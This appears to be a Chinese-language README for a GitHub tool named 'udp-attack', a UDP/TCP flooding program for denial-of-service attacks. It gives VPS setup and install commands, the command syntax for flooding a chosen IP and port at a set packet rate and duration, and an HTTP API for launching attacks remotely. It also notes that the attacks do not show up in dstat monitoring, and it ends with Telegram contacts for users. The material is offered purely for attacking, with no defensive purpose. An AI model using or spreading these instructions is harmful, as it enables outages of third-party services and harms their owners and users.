# udp-attack 一个简单的udp攻击程序
# 版本：1.1
# 发布时间：2020/02/07
<p>安装所需：</p>
<li>一台能发包的VPS</li>
<li>Centos 7.x系统</li>
<br>
请选择磁盘丰富的位置 执行以下命令
<br>

```BASH
cd ~
yum update
yum install epel-release
yum install http://rpms.remirepo.net/enterprise/remi-release-7.rpm
yum install yum-utils
yum-config-manager --enable remi-php72
yum update
yum install php72
yum install php72-php-fpm php72-php-gd php72-php-json php72-php-mbstring php72-php-mysqlnd php72-php-xml php72-php-xmlrpc php72-php-opcache
systemctl enable php72-php-fpm.service
yum install -y git wget curl net-tools
git clone https://github.com/KLDGodY/udp-attack.git
cd udp-attack
perl setup.pl
```

<blockquote>如果显示perl没有安装，，请自行到网上找教程，，，</blockquote>
安装过程中如果问你要不要安装某些东西，按y同意
<br>
等待安装好后，，就可以开始攻击力，，
命令格式：<pre>perl /root/ssyn.pl 要攻击的IP 端口 每秒发送数据包(bytes) 持续攻击秒数</pre>
当然你也可以用api攻击，api地址是<pre>http://你的服务器地址/api.php?key=[yourvpspassword(root)]&host=[host]&port=[port]&time=[time]&method=[method]</pre>
说一下，method有3种模式，分别是udp，tcp，和stop，，攻击不会在dstat中呈现
<br>
我的tg：<a href="//t.me/KLDGodY">@KLDGodY</a><br>
tg水群：<a href="//t.me/kldgodygroup">@KLDGodYGroup</a><br>欢迎各位dl加入，，，
